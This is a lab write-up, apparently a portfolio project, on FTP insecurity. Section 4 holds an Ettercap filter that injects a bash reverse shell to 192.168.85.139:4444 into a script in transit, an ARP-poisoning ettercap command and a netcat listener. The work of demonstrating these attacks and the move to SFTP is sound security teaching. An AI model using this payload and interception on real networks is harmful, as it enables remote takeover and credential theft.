---
title: "FTP Security and SFTP Implementation"
date: "2025-03-10"
description: " A hands-on project showcasing FTP vulnerabilities like plaintext credential interception and file tampering, followed by implementing SFTP to ensure secure, encrypted file transfers."
technologies:  ["Linux (Ubuntu, Kali)", "vsftpd", "Wireshark", "Ettercap", "OpenSSH", "SFTP", "Netcat"]
---

# FTP Security and SFTP Implementation

## **1. Introduction**

### **1.1 Project Overview**

File Transfer Protocol (FTP) is a widely used method for transferring files between systems, but it comes with inherent security risks due to its plaintext transmission. This project aims to demonstrate these vulnerabilities by setting up an FTP server, intercepting credentials, and exploiting weaknesses. Following this, we will implement Secure File Transfer Protocol (SFTP) to showcase a secure alternative with encrypted communication.

### **1.2 Objectives**

- Set up an FTP server and create a user for file transfers.
    
- Demonstrate FTP vulnerabilities by capturing plaintext credentials.
    
- Exploit FTP weaknesses by modifying FTP traffic in transit.
    
- Implement SFTP to mitigate security risks and ensure encrypted data transmission.
    
- Compare FTP and SFTP in terms of security and effectiveness.

### **1.3 Tools and Technologies**

- **Operating System:** Linux (Ubuntu, Kali Linux)
    
- **FTP Server:** vsftpd (Very Secure FTP Daemon)
    
- **Network Monitoring:** Wireshark
    
- **Secure File Transfer:** OpenSSH for SFTP configuration
	
- Pentesting: Ettercap

## **2. Setting Up FTP**

### **2.1 Creating an FTP User**

1. Install vsftpd on the server:
    
    ```bash
    sudo apt update && sudo apt install vsftpd -y
    ```
    
2. Create a new user for FTP access:
    
    ```bash
    sudo adduser ftpuser
    ```
    
3. Assign proper directory permissions:
    
    ```bash
    sudo mkdir -p /home/ftpuser/ftp
    sudo chown nobody:nogroup /home/ftpuser/ftp
    sudo chmod a-w /home/ftpuser/ftp
    ```
    
    - The ftp directory is created and owned by nobody:nogroup to restrict write access.
    
### **2.2 Configuring FTP Access**

1. Open the vsftpd configuration file:
    
    ```bash
    sudo nano /etc/vsftpd.conf
    ```

2. Modify the following settings:
    
```ini
    anonymous_enable=NO
    local_enable=YES
    chroot_local_user=YES
    allow_writeable_chroot=YES
```
    
    - `anonymous_enable=NO`: Disables anonymous access.
        
    - `local_enable=YES`: Allows local system users to log in.
        
    - `chroot_local_user=YES`: Restricts users to their home directory.
        
    - `allow_writeable_chroot=YES`: Prevents vsftpd from denying access due to chroot restrictions.
    
3. Restart the FTP service to apply changes:
    
    ```bash
    sudo systemctl restart vsftpd
    ```
    
4. Enable FTP service on boot:
    
    ```bash
    sudo systemctl enable vsftpd
    ```

### **2.3 Testing FTP Connectivity**

1. Verify that the FTP server is running:
    
    ```bash
    sudo systemctl status vsftpd
    ```
    
2. Use an FTP client such as command-line FTP to test access:
    
    ```bash
    ftp ftpuser@<server-ip>
    ```
    
3. Log in with the credentials of the created user.
    
![](/Screenshots/ftp_pics/ftpconn.png)

## **3. Demonstrating FTP Vulnerabilities**

### **3.1 Understanding Plaintext Transmission in FTP**

FTP transmits data, including usernames and passwords, in plaintext, making it highly susceptible to interception. Any attacker with access to the network can capture these credentials using packet-sniffing tools. This security flaw highlights the necessity of encrypted alternatives like SFTP.

### **3.2 Intercepting Credentials (Packet Capture & Analysis)**

1. **Start Wireshark on the attack machine:**
    
    ```bash
    sudo wireshark
    ```
    
    - Wireshark provides a graphical interface for packet analysis.
    
2. **Monitor FTP traffic while a user logs in.**
    
    - Observe captured packets and locate the credentials transmitted in plaintext.
        
    - Use Wireshark’s Follow TCP Stream feature to extract login details.
        
3. **Analyze the captured data.**
    
    - The username and password should be visible in the packet contents.
        
    - This step demonstrates why FTP should not be used for secure data transmission.
	
![](/Screenshots/ftp_pics/creds_captured.png)

## **4. Exploiting FTP Weaknesses**

This section aims to demonstrate how an attacker can exploit FTP weaknesses by intercepting and modifying the contents of a shell script file using Ettercap. The attack scenario assumes that the victim downloads a file named system.sh from an FTP server, and the attacker injects a malicious payload into the script while it is in transit.

### **Attack Overview**

1. The victim initiates an FTP download of system.sh from the server.
    
2. The attacker, positioned on the same network, uses Ettercap to intercept and modify the file in real-time.
    
3. The victim unknowingly executes the modified script, which contains a malicious payload.
### **4.1 Creating a Dummy Script (system.sh)**

1. Create a simple script in the ftpuser home directory:
    
    ```
    echo -e "#!/bin/bash\necho 'Update finished'" > system.sh
    ```

![](/Screenshots/ftp_pics/syssh.png)

- This file is now accessible to any client that connects to the FTP server.

![](/Screenshots/ftp_pics/get.png)
### **4.2 Modifying the Script to Include a Reverse Shell**

Ettercap allows attackers to manipulate network traffic by using custom filter scripts. Below is an Ettercap filter script designed to modify an FTP-transferred shell script in transit:

```
if (ip.proto == TCP) {
    if (search(DATA.data, "bin/bash")) {
        replace("bin/bash", "bin/bash\necho \"malicious code\"\nbash -i >& /dev/tcp/192.168.85.139/4444 0>&1\");
        msg("FTP file modification successful!\n");
    }
}
```

### **Breakdown of the Ettercap Filter Script**

1. `if (ip.proto == TCP) { ... }`
    
    - This condition ensures that the script processes only TCP packets, as FTP operates over TCP.
    
2. `if (search(DATA.data, "bin/bash")) { ... }`
    
    - The script scans for occurrences of "bin/bash" within the packet payload. This is done to identify shell script files.
    
3. `replace("bin/bash", "bin/bash\necho \"malicious code\"\nbash -i >& /dev/tcp/192.168.85.139/4444 0>&1\");`
    
    - This command injects a backdoor into the shell script.

### **4.3 Simulating the Attack and Exploiting the System**

Once the filter script is written, it needs to be compiled before use:

1. Save the script as filter.ecf
    
2. Compile the filter using Ettercap’s built-in compiler:
    
    ```
    etterfilter filter.ecf
    ```

3. Launch Ettercap in ARP poisoning mode to intercept the traffic between the FTP client and server:
    
    ```
    ettercap -Tq -i eth0 -F filter.ef -M arp:remote //victim_IP/ //FTP_server_IP/
    ```
    
    - -Tq: Runs Ettercap in text mode with quiet output.
        
    - -i eth0: Specifies the network interface.
        
    - -F filter.ef: Loads the compiled filter.
        
    - -M arp:remote: Enables ARP poisoning for man-in-the-middle attacks.
        
4. When the victim downloads the system.sh file, Ettercap modifies its contents in real time.
	
![](/Screenshots/ftp_pics/modified.png)
3. Set up a listener on the attack machine:
    
    ```
    nc -lvnp 4444
    ```
    
    - The attacker waits for a connection.
    
4. The victim executes the modified script, granting the attacker a shell.
	
    - Once executed, the system unknowingly connects back to the attacker's machine, providing remote access.
    
![](/Screenshots/ftp_pics/victim.png)
	
![](/Screenshots/ftp_pics/attacker.png)

## **5. Securing File Transfers with SFTP**

### **5.1 Setting Up SFTP**

SFTP (Secure File Transfer Protocol) is a secure alternative to FTP, providing encrypted file transfer capabilities. Unlike FTP, which transmits data in plaintext, SFTP ensures that all data transferred between the client and server is encrypted, preventing unauthorized access and man-in-the-middle (MITM) attacks.

To configure SFTP, you'll first need to ensure that SSH (Secure Shell) is installed and configured on the server. SSH serves as the foundation for SFTP, as SFTP relies on SSH for secure communication.

#### 1. **Install and Configure SSH (if not already installed)**

If SSH isn't already installed on your server, you'll need to install the OpenSSH server:

```bash
sudo apt update
sudo apt install openssh-server
```

Once installed, we should enable SSH and the service can be checked using:

```bash
sudo systemctl start ssh
sudo systemctl status ssh
```

#### 2. **Restrict SFTP Access for a Specific User**

Next, you will configure the SSH server to only allow SFTP access for specific users, and optionally, restrict them to specific directories (like their home directories).

To do this, we’ll modify the SSH configuration file (/etc/ssh/sshd_config).

1. **Edit the SSH configuration file:**
    
```bash
sudo nano /etc/ssh/sshd_config
```

2. **Add the following configurations:**
    
```ini
Subsystem sftp internal-sftp

# Restrict SFTP access to the user "sftpuser"
Match User sftpuser
    ChrootDirectory /home/sftpuser
    ForceCommand internal-sftp
    AllowTcpForwarding no
```


- **Subsystem sftp internal-sftp**: This line specifies that the internal SFTP server should be used, which is provided as part of the OpenSSH package.
    
- **Match User sftpuser**: This matches a specific user (sftpuser in this case) and applies the subsequent settings only to that user.
    
- **ChrootDirectory /home/sftpuser**: This restricts the user to a specific directory. The user can only access files within their home directory (/home/sftpuser), and they cannot move outside this directory.
    
- **ForceCommand internal-sftp**: This ensures that the user can only use the SFTP subsystem and cannot execute arbitrary commands on the server.
    
- **AllowTcpForwarding no**: This disables TCP forwarding for the user, further restricting their ability to use SSH for anything other than SFTP.
    

3. **Restart the SSH service** to apply the changes:
    

```bash
sudo systemctl restart ssh
```

#### 3. **Testing SFTP Access**

Once the configuration is complete, you can test the SFTP connection by trying to log in as the sftpuser:

```bash
sftp sftpuser@<server-ip>
```

This command connects to the server using SFTP, and it should prompt for the sftpuser's password. After logging in, the user will only have access to their ChrootDirectory, typically /home/sftpuser, and will be unable to access other parts of the system.

![](/Screenshots/ftp_pics/sftp.png)

### **5.2 Demonstrating Encrypted Communication**

One of the primary advantages of SFTP over FTP is encryption. In SFTP, both the command channel (where commands such as put or get are sent) and the data channel (where file transfers occur) are encrypted. This prevents eavesdropping and ensures that any credentials or files exchanged are not exposed to attackers.

Here’s how to demonstrate this:

1. **SFTP Connection Example:**
    

```bash
sftp sftpuser@<server-ip>
```

Upon initiating the connection, you'll notice that the entire communication, including login credentials and file data, is encrypted. While using a network monitoring tool like **Wireshark**, you’ll find that the data being transmitted is not readable or in plaintext.

2. **Capturing the Encrypted Traffic:**

![](/Screenshots/ftp_pics/enc.png)

In a real-world scenario, an attacker may attempt to capture traffic between the client and the server using a packet sniffer (like Wireshark). However, since SFTP uses SSH encryption, the captured packets will be unreadable, ensuring the confidentiality of the communication.

## **6. Conclusion**

This project demonstrated the inherent security risks of FTP, including plaintext credential transmission and susceptibility to MITM attacks. We exploited these weaknesses by intercepting credentials and modifying files in transit. To mitigate these vulnerabilities, we implemented SFTP, which ensures encrypted communication and secure file transfers.

Through this comparison, it is clear that FTP should not be used for sensitive data, as it lacks encryption and authentication safeguards. SFTP, with its robust encryption and security mechanisms, is the preferred choice for secure file transfers. Organizations should adopt SFTP to protect their data from interception and unauthorized modifications.

